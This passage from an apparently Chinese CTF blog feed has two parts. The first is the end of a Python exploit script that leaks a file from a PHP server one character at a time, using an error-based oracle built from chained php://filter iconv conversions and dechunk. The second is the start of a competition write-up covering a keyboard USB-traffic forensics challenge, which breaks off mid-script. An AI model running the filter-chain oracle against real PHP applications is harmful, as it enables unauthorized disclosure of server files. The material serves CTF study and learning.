class="string">&#x27;s&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="comment"># S</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># i j k</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;k&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;j&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># I J K</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;K&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># v w x</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;w&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># V W X</span></span><br><span class="line">        <span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;W&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;V&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># z</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># M</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># m</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># Y</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># l</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># L</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># h</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;h&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># H</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># u</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># U</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;U&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># g</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;g&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># G</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># t</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;t&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">        <span class="comment"># T</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>&#x27;</span></span><br><span class="line">    letter = find_letter(prefix)</span><br><span class="line">    <span class="comment"># it&#x27;s a number! check base64</span></span><br><span class="line">    <span class="keyword">if</span> letter == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span></span><br><span class="line">        s = find_letter(prefix)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="comment"># 0 - 3</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">            <span class="comment"># 4 - 7</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            <span class="comment"># 8 - 9</span></span><br><span class="line">            prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">            ss = find_letter(prefix)</span><br><span class="line">            <span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">                letter = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            err(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(end=letter)</span><br><span class="line">    o += letter</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">We are done!! :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">d = b64decode(o.encode() + <span class="string">b&#x27;=&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove KR padding</span></span><br><span class="line"></span><br><span class="line">d = d.replace(<span class="string">b&#x27;$)C&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(d))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 侧信道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结营赛Wp</title>
      <link href="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
      <url>/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="结营赛wp"><a href="#结营赛wp" class="headerlink" title="结营赛wp"></a>结营赛wp</h1><p>最终排名第10，还可以吧</p><p>##misc</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>hsnctf{welcome_to_hsnctf}</p><h3 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3><p>打开压缩包发现，一个流量包和一个flag.zip加密</p><p>应该是通过流量包得到密码解得flag</p><p>流量包是键盘流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">─$ tshark -T json -r usb.pcapng &gt; test.json </span><br></pre></td></tr></table></figure><p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/image/QQ%E5%9B%BE%E7%89%8720230818231436-1700989357412-27-1700994419702-2.png"></p><p>手动提取键盘流量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">06</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1f</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">17</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1</span>c:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure><p>之后利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span 